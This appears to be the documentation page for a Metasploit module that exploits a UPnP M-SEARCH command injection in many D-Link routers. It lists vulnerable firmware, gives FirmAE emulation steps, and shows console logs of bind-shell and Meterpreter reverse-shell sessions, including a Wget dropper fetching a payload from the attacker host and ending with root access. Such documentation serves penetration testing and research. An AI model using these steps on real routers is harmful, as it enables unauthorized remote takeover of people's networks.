## Vulnerable Application
This vulnerability is based on an old theme that was discovered in 2013 by `Zach Cutlip` and explained in
his blog [The Shadow File](https://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html).
It is based on the infamous `UPnP` attack where a command injection vulnerability exists in multiple D-Link network products,
allowing an attacker to inject arbitrary command to the `UPnP` via a crafted M-SEARCH packet.
Universal Plug and Play (UPnP), by default is enabled in most D-Link devices, on the port 1900 and an attacker can perform
a remote command execution by injecting the payload into the `Search Target` (ST) field of the SSDP M-SEARCH discover packet.

## Installation
Ideally, to test this module, you would need a vulnerable D-Link device.
However, by downloading the firmware and install and use `FirmAE` to emulate the router,
we can simulate the router and test the vulnerable endpoint.

This module has been tested on:
- [ ] FirmAE running on Kali Linux 2023.3
* D-Link Router model DIR-300 revisions Ax with firmware v1.06 or older;
* D-Link Router model DIR-300 revisions Bx with firmware v2.15 or older;
* D-Link Router model DIR-600 revisions Bx with firmware v2.18 or older;
* D-Link Router model DIR-645 revisions Ax with firmware v1.05 or older;
* D-Link Router model DIR-815 revisions Bx with firmware v1.04 or older;
* D-Link Router model DIR-816L revisions Bx with firmware v2.06 or older;
* D-Link Router model DIR-817LW revisions Ax with firmware v1.04b01_hotfix or older;
* D-Link Router model DIR-818LW revisions Bx with firmware v2.05b03_Beta08 or older;
* D-Link Router model DIR-822 revisions Bx with firmware v2.03b01 or older;
* D-Link Router model DIR-822 revisions Cx with firmware v3.12b04 or older;
* D-Link Router model DIR-823 revisions Ax with firmware v1.00b06_Beta or older;
* D-Link Router model DIR-845L revisions Ax with firmware v1.02b05 or older;
* D-Link Router model DIR-860L revisions Ax with firmware v1.12b05 or older;
* D-Link Router model DIR-859 revisions Ax with firmware v1.06b01Beta01 or older;
* D-Link Router model DIR-860L revisions Ax with firmware v1.10b04 or older;
* D-Link Router model DIR-860L revisions Bx with firmware v2.03b03 or older;
* D-Link Router model DIR-865L revisions Ax with firmware v1.07b01 or older;
* D-Link Router model DIR-868L revisions Ax with firmware v1.12b04 or older;
* D-Link Router model DIR-868L revisions Bx with firmware v2.05b02 or older;
* D-Link Router model DIR-869 revisions Ax with firmware v1.03b02Beta02 or older;
* D-Link Router model DIR-880L revisions Ax with firmware v1.08b04 or older;
* D-Link Router model DIR-890L/R revisions Ax with firmware v1.11b01_Beta01 or older;
* D-Link Router model DIR-885L/R revisions Ax with firmware v1.12b05 or older;
* D-Link Router model DIR-895L/R revisions Ax with firmware v1.12b10 or older;
* probably more looking at the scale of impacted devices :-(

### Installation steps to emulate the router firmware with FirmAE
* Install `FirmAE` on your Linux distribution using the installation instructions provided [here](https://github.com/pr0v3rbs/FirmAE).
* To emulate the specific firmware that comes with the D-Link devices, `binwalk` might need to be able to handle a sasquatch filesystem.
* Follow installation and compilation steps that you can find [here](https://gist.github.com/thanoskoutr/4ea24a443879aa7fc04e075ceba6f689).
* Please do not forget to run this after your `FirmAE` installation otherwise you will not be able to extract the firmware.
* Download  the vulnerable firmware from D-Link [here](http://legacyfiles.us.dlink.com/).
* Pick `DIR-865L_REVA_FIRMWARE_1.07.B01.ZIP` for the demonstration.
* Start emulation.
* First run `./init.sh` to initialize and start the Postgress database.
* Start a debug session  `./run.sh -d d-link /root/FirmAE/firmwares/DIR-865L_REVA_FIRMWARE_1.07.B01.ZIP`
* This will take a while, but in the end you should see the following...

```shell
[*] /root/FirmAE/firmwares/DIR-865L_REVA_FIRMWARE_1.07.B01.ZIP emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
mke2fs 1.47.0 (5-Feb-2023)
e2fsck 1.47.0 (5-Feb-2023)
[*] infer network start!!!

[IID] 25
[MODE] debug
[+] Network reachable on 192.168.0.1!
[+] Web service on 192.168.0.1
[+] Run debug!
Creating TAP device tap25_0...
Set 'tap25_0' persistent and owned by uid 0
Initializing VLAN...
Bringing up TAP device...
Starting emulation of firmware... 192.168.0.1 true true 60.479548271 107.007791943
/root/FirmAE/./debug.py:7: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  import telnetlib
[*] firmware - DIR600B6_FW215WWb02
[*] IP - 192.168.0.1
[*] connecting to netcat (192.168.0.1:31337)
[+] netcat connected
------------------------------
|       FirmAE Debugger      |
------------------------------
1. connect to socat
2. connect to shell
3. tcpdump
4. run gdbserver
5. file transfer
6. exit
> 2
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.

/ # uname -a
Linux dlinkrouter 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux
/ # hostname
dlinkrouter
/ #
```

* You should now be able to `ping` the network address 192.168.0.1 from your host and
* run a `nmap` command to check the services (HTTP TCP port 80 and UPNP UDP port 1900)

```shell
 # ping 192.168.0.1
PING 192.168.0.1 (192.168.0.1) 56(84) bytes of data.
64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=8.92 ms
64 bytes from 192.168.0.1: icmp_seq=2 ttl=64 time=2.38 ms
^C
--- 192.168.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 2.384/5.650/8.916/3.266 ms
 # nmap 192.168.0.1
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 18:33 UTC
Nmap scan report for 192.168.0.1
Host is up (0.022s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
443/tcp   open  https
8181/tcp  open  intermapper
49152/tcp open  unknown
MAC Address: 00:DE:FA:1A:01:00 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
 # nmap -sU 192.168.0.1
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 18:34 UTC
Nmap scan report for 192.168.0.1
Host is up (0.0019s latency).
Not shown: 993 closed udp ports (port-unreach)
PORT      STATE         SERVICE
53/udp    open          domain
67/udp    open|filtered dhcps
137/udp   open|filtered netbios-ns
1900/udp  open|filtered upnp
5353/udp  open          zeroconf
5355/udp  open|filtered llmnr
19541/udp open|filtered jcp
MAC Address: 00:DE:FA:1A:01:00 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1054.98 seconds
```
You are now ready to test the module using the emulated router hardware on IP address 192.168.0.1.

## Verification Steps
- [x] Start `msfconsole`
- [x] `use exploit/linux/upnp/dlink_upnp_msearch_exec`
- [x] `set rhosts <ip-target>`
- [x] `set rport 1900`
- [x] `set http_port 80`
- [x] `set lhost <ip-attacker>`
- [x] `set target <0=Unix Command, 1=Linux Dropper>`
- [x] `exploit`

you should get a `shell` or `Meterpreter`

```shell
msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > options

Module options (exploit/linux/upnp/dlink_upnp_msearch_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.0.1      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      1900             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   HTTP_PORT  80               yes       Universal Plug and Play (UPnP) UDP port
   URIPATH                     no        The URI to use for this exploit (default is random)
   URN        urn:device:1     no        Set URN payload
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/bind_busybox_telnetd):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   LOGIN_CMD  /bin/sh          yes       Command telnetd will execute on connect
   LPORT      4444             yes       The listen port
   RHOST      192.168.0.1      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Unix Command


View the full module info with the info, or info -d command.
```

## Options
### HTTP_PORT
Port setting where the HTTP and SOAP service is running, typically port 80.
This is used to discover the d-link hardware and version information by scraping the web or soap response.

## Scenarios
###  FirmAE D-Link DIR-865L Router Emulation Unix Command -  cmd/unix/bind_busybox_telnetd
```shell
msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > check

[*] Checking if 192.168.0.1:1900 can be exploited.
[*] 192.168.0.1:1900 - The target appears to be vulnerable. Product info: DIR-865L|1.07|A1|mipsle
msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > exploit

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.0.1:1900 can be exploited.
[+] The target appears to be vulnerable. Product info: DIR-865L|1.07|A1|mipsle
[*] Executing Unix Command for cmd/unix/bind_busybox_telnetd
[*] Started bind TCP handler against 192.168.0.1:4444
[*] Command shell session 1 opened (192.168.0.2:42349 -> 192.168.0.1:4444) at 2023-10-17 18:35:36 +0000

Shell Banner:
_!_

 # uname -a
uname -a
Linux dlinkrouter 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux
 # hostname
hostname
dlinkrouter
 #
```
### FirmAE D-Link DIR-865L Router Emulation Linux Dropper -  linux/mipsle/meterpreter_reverse_tcp
```shell
msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > set target 1
target => 1
msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > set payload linux/mipsle/meterpreter_reverse_tcp
payload => linux/mipsle/meterpreter_reverse_tcp
msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > set lhost 192.168.0.2
lhost => 192.168.0.2
msf6 exploit(linux/upnp/dlink_upnp_msearch_exec) > exploit

[*] Started reverse TCP handler on 192.168.0.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.0.1:1900 can be exploited.
[+] The target appears to be vulnerable. Product info: DIR-865L|1.07|A1|mipsle
[*] Executing Linux Dropper for linux/mipsle/meterpreter_reverse_tcp
[*] Using URL: http://192.168.0.2:8080/5W7O47FX
[*] Command Stager progress - 100.00% done (112/112 bytes)
[*] Client 192.168.0.1 (Wget) requested /5W7O47FX
[*] Sending payload to 192.168.0.1 (Wget)
[*] Meterpreter session 2 opened (192.168.0.2:4444 -> 192.168.0.1:59600) at 2023-10-17 18:45:12 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.0.1
OS           :  (Linux 4.1.17+)
Architecture : mips
BuildTuple   : mipsel-linux-muslsf
Meterpreter  : mipsle/linux
meterpreter > getuid
Server username: root
meterpreter >
```
## Limitations
Staged meterpreter payloads might core dump on the target, so use stage-less meterpreter payloads when using the Linux Dropper target.
Some D-Link devices do not have the `wget` command so configure `echo` as cmd-stager flavor with the command `set CMDSTAGER::FLAVOR echo`.
